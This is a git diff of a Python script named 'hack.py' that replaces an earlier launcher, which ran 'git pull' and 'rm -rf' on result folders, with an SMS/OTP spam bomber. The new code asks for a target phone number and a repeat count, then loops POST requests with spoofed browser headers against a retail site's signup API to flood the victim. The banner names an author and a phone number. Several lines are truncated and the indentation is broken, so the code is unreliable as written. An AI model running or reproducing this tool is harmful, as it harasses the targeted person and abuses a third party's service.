@@ -1,18 +1,39 @@
-#######################################################
-# Name           : Fanky Aditya                       #
-# File           : hack.py                            #
-# Author         : Fanky                              #
-# Github         :                                    #
-# Facebook       :                                    #
-# Website        :                                    #
-# Python version : 0.3                                #
-#######################################################
-
-############# DON'T REMOVE THIS FUNCTIONS #############
-
+import json
+import requests
+import sys
 import os
-from install.sh import cok as yy
 
-if __name__ == "__main__":
-    os.system("git pull");os.system("rm -rf results/OK/...");os.system("rm -rf results/CP/...")
-    yy.cek_server()
+
+def main() :
+        os.system('clear')
+        banner = '''
+        [*]AUTHOR :FANKY
+        [*]WHATSAP:0895386194665
+        [*]tangal :19 april 2022
+        '''
+
+
+        print (banner)
+        no = input('target : ')
+        jum = input('jumlah spam : ')
+
+        head = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 11; M2010J19SG) AppleWebKit/53>
+        "Referer": "https://www.mapclub.com/en/user/signup",
+        "Host": "cmsapi.mapclub.com",
+        }
+
+
+        dat = {
+        'iphone' : no
+        }
+
+
+        for x in range(int(jum)):
+                        leosureo = requests.post("https://cmsapi.mapclub.com/api/>
+        if 'eror' in leosureo:
+                print('gagal mengirim' + no )
+        else:
+                print('succes mengirim' + no )
+
+main()
